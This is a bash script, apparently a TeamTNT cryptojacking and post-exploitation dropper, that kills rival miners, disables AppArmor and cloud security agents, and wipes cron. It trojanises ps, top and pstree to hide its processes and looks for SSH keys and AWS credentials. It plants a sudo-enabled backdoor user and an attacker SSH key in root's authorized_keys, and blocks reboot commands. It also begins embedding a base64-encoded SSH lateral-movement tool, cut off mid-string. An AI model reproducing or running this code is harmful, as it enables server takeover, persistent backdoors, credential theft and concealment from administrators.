chattr +i /tmp/kdevtmpfsi
sleep 1
chattr -i /tmp/redis2
echo 1 > /tmp/redis2
chattr +i /tmp/redis2
chattr -ia /.Xll/xr
>/.Xll/xr
chattr +ia /.Xll/xr
chattr -ia /etc/trace
>/etc/trace
chattr +ia /etc/trace
chattr -ia /etc/newsvc.sh
chattr -ia /etc/svc*
chattr -ia /tmp/newsvc.sh
chattr -ia /tmp/svc*
>/etc/newsvc.sh
>/etc/svcupdate
>/etc/svcguard
>/etc/svcworkmanager
>/etc/svcupdates
>/tmp/newsvc.sh
>/tmp/svcupdate
>/tmp/svcguard
>/tmp/svcworkmanager
>/tmp/svcupdates
chattr +ia /etc/newsvc.sh
chattr +ia /etc/svc*
chattr +ia /tmp/newsvc.sh
chattr +ia /tmp/svc*
sleep 1
chattr -ia /etc/phpupdate
chattr -ia /etc/phpguard
chattr -ia /etc/networkmanager
chattr -ia /etc/newdat.sh
>/etc/phpupdate
>/etc/phpguard
>/etc/networkmanager
>/etc/newdat.sh
chattr +ia /etc/phpupdate
chattr +ia /etc/phpguard
chattr +ia /etc/networkmanager
chattr +ia /etc/newdat.sh
chattr -ia /etc/zzh
chattr -ia /etc/newinit
>/etc/zzh
>/etc/newinit
chattr +ia /etc/zzh
chattr +ia /etc/newinit
sleep 1
chattr -i /usr/lib/systemd/systemd-update-daily
echo 1 > /usr/lib/systemd/systemd-update-daily
chattr +i /usr/lib/systemd/systemd-update-daily
#yum install -y docker.io || apt-get install docker.io;
docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
#echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
chattr -R -ia /var/spool/cron
chattr -ia /etc/crontab
chattr -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}
kill_miner_proc

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "crypto"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "crypto"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_sus_proc

#FixTheSystem

function SetupNameServers(){	
grep -q 8.8.8.8 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
grep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
}

SetupNameServers


chattr -iR /var/spool/cron/
tntrecht -iR /var/spool/cron/
crontab -r

function clean_cron(){
chattr -R -ia /var/spool/cron
tntrecht -R -ia /var/spool/cron
chattr -ia /etc/crontab
tntrecht -ia /etc/crontab
chattr -R -ia /etc/cron.d
tntrecht -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
tntrecht -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}

clean_cron


function lock_cron()
{
    chattr -R +ia /var/spool/cron
    tntrecht -R +ia /var/spool/cron
    touch /etc/crontab
    chattr +ia /etc/crontab
    tntrecht +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    tntrecht -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
    tntrecht -R +ia /etc/cron.d
}

lock_cron

function CheckAboutSomeKeys(){
    if [ -f "/root/.ssh/id_rsa" ]
    then
			echo 'found: /root/.ssh/id_rsa'
    fi

    if [ -f "/home/*/.ssh/id_rsa" ]
    then
			echo 'found: /home/*/.ssh/id_rsa'
    fi

    if [ -f "/root/.aws/credentials" ]
    then
			echo 'found: /root/.aws/credentials'
    fi

    if [ -f "/home/*/.aws/credentials" ]
    then
			echo 'found: /home/*/.aws/credentials'
    fi
}

CheckAboutSomeKeys


if [ -f "/usr/bin/TeamTNT/[crypto]" ]
then 
service crypto stop
rm -fr /usr/bin/TeamTNT/
fi

function SecureTheSystem(){
echo "begin  SecureTheSystem"
    if [ -f "/bin/ps.original" ]
    then
        echo "/bin/ps changed"
    else
        mv /bin/ps /bin/ps.original    
        echo "#! /bin/bash">>/bin/ps
        echo "ps.original \$@ | grep -v \"crypto\|scan\"">>/bin/ps
        chmod +x /bin/ps
                touch -d 20160825 /bin/ps
        echo "/bin/ps changing"
    fi
    if [ -f "/bin/top.original" ]
    then
        echo "/bin/top changed"
    else
        mv /bin/top /bin/top.original  
        echo "#! /bin/bash">>/bin/top
        echo "top.original \$@ | grep -v \"crypto\|scan\"">>/bin/top
        chmod +x /bin/top
                touch -d 20160825 /bin/top
        echo "/bin/top changing"
    fi
    if [ -f "/bin/pstree.original" ]
    then
        echo "/bin/pstree changed"
    else
        mv /bin/pstree /bin/pstree.original
        echo "#! /bin/bash">>/bin/pstree
        echo "pstree.original \$@ | grep -v \"crypto\|scan\"">>/bin/pstree
        chmod +x /bin/pstree
                touch -d 20160825 /bin/pstree
        echo "/bin/pstree changing"
    fi
    if [ -f "/bin/chattr" ]
        then
                chattrsize=`ls -l /bin/chattr | awk '{ print $5 }'`
                if [ "$chattrsize" -lt "$chattr_size" ]
                then
            yum -y remove e2fsprogs
            yum -y install e2fsprogs
                else
                        echo "no need install chattr"
                fi
        else
            yum -y remove e2fsprogs
            yum -y install e2fsprogs
    fi
}

function LockDownTheSystem(){
LOCKDOWNARRAY=(shutdown reboot poweroff telinit)
for LOCKDOWN in ${LOCKDOWNARRAY[@]}; do
LOCKDOWNBIN=`which $LOCKDOWN` 2>/dev/null 1>/dev/null
chattr -i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
tntrecht -i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
chattr -x $LOCKDOWNBIN 2>/dev/null 1>/dev/null
#chmod 000 $LOCKDOWNBIN 2>/dev/null 1>/dev/null
chattr +i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
tntrecht +i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
done

chattr +i /proc/sysrq-trigger 2>/dev/null 1>/dev/null
tntrecht +i /proc/sysrq-trigger 2>/dev/null 1>/dev/null


LOCKDOWNFILES=("/lib/systemd/system/reboot.target" "/lib/systemd/system/systemd-reboot.service")
for LOCKDOWNFILE in ${LOCKDOWNFILES[@]}; do

chattr -i $LOCKDOWNFILE 2>/dev/null 1>/dev/null
tntrecht -i $LOCKDOWNFILE 2>/dev/null 1>/dev/null
chattr -x $LOCKDOWNFILE 2>/dev/null 1>/dev/null
> $LOCKDOWNFILE
rm -f $LOCKDOWNFILE 2>/dev/null 1>/dev/null
done

}


function KILLMININGSERVICES(){

echo "[*] Removing previous miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop crypto.service
fi
killall -9 xmrig
echo "do KILLMININGSERVICES"

$(docker rm $(docker ps | grep -v grep | grep "/bin/bash -c 'apt" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
#$(docker rm $(docker ps | grep -v grep | grep "/bin/bash" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)

$(docker rm $(docker ps | grep -v grep | grep "widoc26117/xmr" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "zbrtgwlxz" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
	
	
rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
killall -9 docker-update  2>/dev/null 1>/dev/null

rm -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
pkill -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
killall -9 redis-backup 2>/dev/null 1>/dev/null

rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null

LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='

if [ ! -f /usr/bin/tntrecht ]; then
chattrbin=`which chattr` 
cp $chattrbin /usr/bin/tntrecht 2>/dev/null 1>/dev/null
chmod +x /usr/bin/tntrecht 2>/dev/null 1>/dev/null
chmod -x $chattrbin 2>/dev/null 1>/dev/null
tntrecht +i $chattrbin 2>/dev/null 1>/dev/null
fi

LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='

if [ -f /root/.tmp/xmrig ]; then
chattr -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tntrecht -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tmpxmrig=("/root/.tmp/config.json" "/root/.tmp/config_background.json" "/root/.tmp/xmrig.log" "/root/.tmp/miner.sh" "/root/.tmp/xmrig")
for tmpxmrigfile in ${tmpxmrig[@]}; do
rm -f $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
echo $LOCKFILE | base64 -d > $tmpxmrigfile 
chmod +x $tmpxmrigfile 2>/dev/null 1>/dev/null
chattr +i $tmpxmrigfile 2>/dev/null 1>/dev/null
tntrecht +i $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
killall $tmpxmrigfile 2>/dev/null 1>/dev/null
chmod -x /root/.tmp/xmrig 2>/dev/null 1>/dev/null
rm -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
chattr +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
pkill -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
ps ax| grep xmrig 2>/dev/null 1>/dev/null
done
fi

if [ -f /usr/sbin/cpumon ]; then
cpumonxmr=("/usr/sbin/cpumon" "/usr/cpu")
for cpumonfile in ${cpumonxmr[@]}; do
chattr -i $cpumonfile 2>/dev/null 1>/dev/null
tntrecht -i $cpumonfile 2>/dev/null 1>/dev/null
rm -f $cpumonfile 2>/dev/null 1>/dev/null
pkill -f $cpumonfile 2>/dev/null 1>/dev/null
kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
echo $LOCKFILE | base64 -d > $cpumonfile
chmod +x $cpumonfile 2>/dev/null 1>/dev/null
chattr +i $cpumonfile 2>/dev/null 1>/dev/null
tntrecht +i $cpumonfile 2>/dev/null 1>/dev/null
pkill -f $cpumonfile 2>/dev/null 1>/dev/null
kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
killall $cpumonfile 2>/dev/null 1>/dev/null
done
fi

if [ -f /opt/server ]; then
chattr -i /opt/server 2>/dev/null 1>/dev/null
tntrecht -i /opt/server 2>/dev/null 1>/dev/null
rm -f /opt/server 2>/dev/null 1>/dev/null
pkill -f /opt/server 2>/dev/null 1>/dev/null
kill $(pidof /opt/server) 2>/dev/null 1>/dev/null
fi

if [ -f /tmp/log_rotari ]; then
chattr -i /tmp/log_rotari 2>/dev/null 1>/dev/null
tntrecht -i /tmp/log_rotari 2>/dev/null 1>/dev/null
rm -f /tmp/log_rotari 2>/dev/null 1>/dev/null
pkill -f /tmp/log_rotari 2>/dev/null 1>/dev/null
kill $(pidof /tmp/log_rotari) 2>/dev/null 1>/dev/null
fi

BASH00=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash")
if [ ! -z "$BASH00" ];
then
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash
chattr +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

BASH6400=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash64")
if [ ! -z "$BASH6400" ];
then
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash64 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash64" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash64) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash64 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash64
chattr +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
if [ ! -z "$KINSING1" ];
then
chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
echo $StringToLock > /var/tmp/kinsing
chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
if [ ! -z "$KINSING2" ];
then
chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
echo $StringToLock > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

kill $(ps aux | grep -vw crypto | grep -v grep |grep -v scan | grep -vw "/usr/bin/xmrigMiner" | grep -vw "./shell"  | awk '{if($3>40.0) print $2}')

}

function makesshaxx(){
echo "begin makessh"
RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"
grep -q hilde /etc/passwd || chattr -ia /etc/passwd; 
grep -q hilde /etc/passwd || tntrecht -ia /etc/passwd; 
grep -q hilde /etc/passwd || echo 'hilde:x:1000:1000::/home/hilde:/bin/bash' >> /etc/passwd; chattr +ia /etc/passwd; tntrecht +ia /etc/passwd
grep -q hilde /etc/shadow || chattr -ia /etc/shadow; 
grep -q hilde /etc/shadow || tntrecht -ia /etc/shadow; 
grep -q hilde /etc/shadow || echo 'hilde:$6$7n/iy4R6znS2iq0J$QjcECLSqMMiUUeHR4iJmkHLzAwgoNRhCC87HI3df95nZH5569TKwJEN2I/lNanPe0vhsdgfILPXedlWlZn7lz0:18461:0:99999:7:::' >> /etc/shadow; chattr +ia /etc/shadow; tntrecht +ia /etc/shadow
grep -q hilde /etc/sudoers || chattr -ia /etc/sudoers; 
grep -q hilde /etc/sudoers || tntrecht -ia /etc/sudoers; 
grep -q hilde /etc/sudoers || echo 'hilde  ALL=(ALL:ALL) ALL' >> /etc/sudoers; chattr +i /etc/sudoers; tntrecht +i /etc/sudoers

mkdir /home/hilde/.ssh/ -p  
touch /home/hilde/.ssh/authorized_keys  
touch /home/hilde/.ssh/authorized_keys2  
chmod 600 /home/hilde/.ssh/authorized_keys
chmod 600 /home/hilde/.ssh/authorized_keys2
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || chattr -ia /home/hilde/.ssh/authorized_keys; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || tntrecht -ia /home/hilde/.ssh/authorized_keys; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || echo $RSAKEY > /home/hilde/.ssh/authorized_keys; chattr +ia /home/hilde/.ssh/authorized_keys; tntrecht +ia /home/hilde/.ssh/authorized_keys;
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || chattr -ia /home/hilde/.ssh/authorized_keys2; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || tntrecht -ia /home/hilde/.ssh/authorized_keys2; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || echo $RSAKEY > /home/hilde/.ssh/authorized_keys2; chattr +ia /home/hilde/.ssh/authorized_keys2; tntrecht +ia /home/hilde/.ssh/authorized_keys2;
mkdir /root/.ssh/ -p  
touch /root/.ssh/authorized_keys  
touch /root/.ssh/authorized_keys2
chmod 600 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys2
grep -q root@puppetserver /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys; 
grep -q root@puppetserver /root/.ssh/authorized_keys || tntrecht -ia /root/.ssh/authorized_keys; 
grep -q root@puppetserver /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys; tntrecht +ia /root/.ssh/authorized_keys
grep -q root@puppetserver /root/.ssh/authorized_keys2 || chattr -ia /root/.ssh/authorized_keys2; 
grep -q root@puppetserver /root/.ssh/authorized_keys2 || tntrecht -ia /root/.ssh/authorized_keys2; 
grep -q root@puppetserver /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2; chattr +ia /root/.ssh/authorized_keys2; tntrecht +ia /root/.ssh/authorized_keys2
}

function CreateSshPunker(){
if [ ! -f "/usr/bin/pu"]
then
echo 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgLSotIGNvZGluZzogdXRmLTggLSotCiMKIyAgICAgICAgICAgICB8CiMgICAgICAgICAgXCAgIHwgICAvCiMgICAgIC4gICAgIFwgIHwgIC8gICAgLgojICAgICAgYC0uX198XC9fXC98Xy4tJwojICAgIC5fXyAgXCAvICAgICBgLi8gIAojICAgICAgIGAtICAgICAgICBAfAojICAgICAgLi0nYC4gICEhICAgIC0gICBwdW5rLnB5IC0gdW5peCBTU0ggcG9zdC1leHBsb2l0YXRpb24gMTMzNyB0b29sCiMgICAgICcgICAgIGAgICEgIF9fLicgIENvcHlyaWdodCAoQykgMjAxOCA8IEdpdXNlcHBlIGByM3ZuYCBDb3J0aSA+CiMgICAgICAgICAgIF8pX19fKCAgICAgIGh0dHBzOi8veGZpbHRyYXRlZC5jb20KIwojIFRoaXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5CiMgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIyB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcgojIChhdCB5b3VyIG9wdGlvbikgYW55IGxhdGVyIHZlcnNpb24uCiMKIyBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKIyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUKIyBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgojCiMgWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UKIyBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4KCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IHJlCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN0cnVjdAppbXBvcnQgaG1hYwppbXBvcnQgYmluYXNjaWkKCnRyeTogCiAgICBpbXBvcnQgcXVldWUgYXMgcXVldWUKZXhjZXB0IEltcG9ydEVycm9yOgogICAgaW1wb3J0IFF1ZXVlIGFzIHF1ZXVlCgoKaG9tZXNCbGFja2xpc3QgPSBbIi9kZXYvbnVsbCIsIi92YXIvZW1wdHkiLCIvYmluIiwiL3NiaW4iXQpzaGVsbEJsYWNrbGlzdCA9IFsiL3NiaW4vbm9sb2dpbiIsIi9iaW4vZmFsc2UiLCIvdXNyL3NiaW4vbm9sb2dpbiIsIi9iaW4vc3luYyJdCmtub3duSG9zdHMgICAgID0gW10Kc3VjY2VzcyAgICAgICAgPSBbXQp1c2VycyAgICAgICAgICA9IFtdCnNzaEtleXMgICAgICAgID0gW10KCiAgIApjbGFzcyBTU0hUaHJlYWQodGhyZWFkaW5nLlRocmVhZCkgOgogCglkZWYgX19pbml0X18oc2VsZiwgcSwgdGlkLCBjcmVkZW50aWFscywgQ01EPSIiKSA6CgkJdGhyZWFkaW5nLlRocmVhZC5fX2luaXRfXyhzZWxmKQoJCXNlbGYucXVldWUgPSBxCgkJc2VsZi50aWQgPSB0aWQKCQlzZWxmLmNyZWRlbnRpYWxzID0gY3JlZGVudGlhbHMKIAoJZGVmIHJ1bihzZWxmKSA6CgkJd2hpbGUgVHJ1ZSA6CgkJCWhvc3QgPSBOb25lIAoJCQl0cnkgOgoJCQkJaG9zdCA9IHNlbGYucXVldWUuZ2V0KHRpbWVvdXQ9MSkKIAoJCQlleGNlcHQgCXF1ZXVlLkVtcHR5IDoKCQkJCXJldHVybgogCgkJCQoJCQlmb3IgdXNlciBpbiB1c2VyczoKCQkJCWZvciBrZXlzIGluIHNzaEtleXM6CgkJCQkJdHJ5OgoJCQkJCQlpZiBpbnQob3Muc3lzdGVtKCJzc2ggLW9CYXRjaE1vZGU9eWVzIC1vU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vUGFzc3dvcmRBdXRoZW50aWNhdGlvbj1ubyAtb0Nvbm5lY3RUaW1lb3V0PTggJXNAJXMgLWkgJXMgLXEgZXhpdCIgJSAodXNlcixob3N0LGtleSApKSkgPT0gMDoKCQkJCQkJCXNlbGYuY3JlZGVudGlhbHMucHV0KHVzZXIrIjoiK2hvc3QrIjoiK2tleSkKCgkJCQkJCQlpZiB1c2VyKyI6Iitob3N0KyI6IitrZXkgbm90IGluIHN1Y2Nlc3M6CgkJCQkJCQkJc3lzLnN0ZG91dC53cml0ZSAoIlwwMzNbOTJtWypdXDAzM1swbSBHb3QgXDAzM1s5Mm0lc0Alc1wwMzNbMG0gd2l0aCBcMDMzWzkybVwiJXNcIlwwMzNbMG0ga2V5LlxuIiAlICh1c2VyLGhvc3Qsa2V5KSkKCQkJCQkJCQlzdWNjZXNzLmFwcGVuZCh1c2VyKyI6Iitob3N0KyI6IitrZXkpCgkJCQkJCQkKCQkJCQkJCWlmIENNRCAhPSAnJzoKCQkJCQkJCQlzeXMuc3Rkb3V0LndyaXRlICgiXDAzM1s5Mm1bKl1cMDMzWzBtIEV4ZWN1dGluZyBcMDMzWzkybSVzXDAzM1swbS5cbiIgJSAoQ01EKSkKCQkJCQkJCQlvcy5zeXN0ZW0oInNzaCAtb0JhdGNoTW9kZT15ZXMgLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9QYXNzd29yZEF1dGhlbnRpY2F0aW9uPW5vIC1vQ29ubmVjdFRpbWVvdXQ9OCAlc0AlcyAtaSAlcyAtcSAtdCBcIiVzXCIgIiAlICh1c2VyLGhvc3Qsa2V5LENNRCkpCgkJCQkJZXhjZXB0OgoJCQkJCQlw